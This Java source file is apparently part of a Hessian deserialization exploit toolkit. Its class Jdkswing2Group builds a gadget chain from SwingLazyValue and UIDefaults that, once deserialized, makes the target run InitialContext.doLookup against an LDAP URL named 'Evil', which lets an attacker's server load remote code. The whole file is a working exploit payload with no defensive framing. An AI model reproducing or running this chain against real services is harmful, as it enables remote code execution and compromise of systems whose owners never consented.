package hessian.payloadGroups;

import gadgetFragment.Entry2EqualFragment;
import hessian.PayloadRunner;
import jdk.payloadGroups.ObjectPayload;
import util.Reflections;

import javax.swing.*;
import java.util.concurrent.ConcurrentHashMap;

public class Jdkswing2Group extends PayloadRunner implements ObjectPayload<Object> {
    public Object getObject(String command) throws Exception {
        command = "ldap://127.0.0.1:8087/Evil";
        ConcurrentHashMap concurrentHashMap = new ConcurrentHashMap();
        concurrentHashMap.put("aaa", "an,");
        UIDefaults uiDefaults = new UIDefaults();
        Object swingLazyValue = Reflections.createWithObjectNoArgsConstructor(Class.forName("sun.swing.SwingLazyValue"));
        Reflections.setFieldValue(swingLazyValue, "className", "javax.naming.InitialContext");
        Reflections.setFieldValue(swingLazyValue, "args", new Object[]{command});
        Reflections.setFieldValue(swingLazyValue, "methodName", "doLookup");
        uiDefaults.put("aaa", swingLazyValue) ;


        return Entry2EqualFragment.getEqualTrigger(uiDefaults, concurrentHashMap, 6);
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jdkswing2Group.class, args);
    }
}
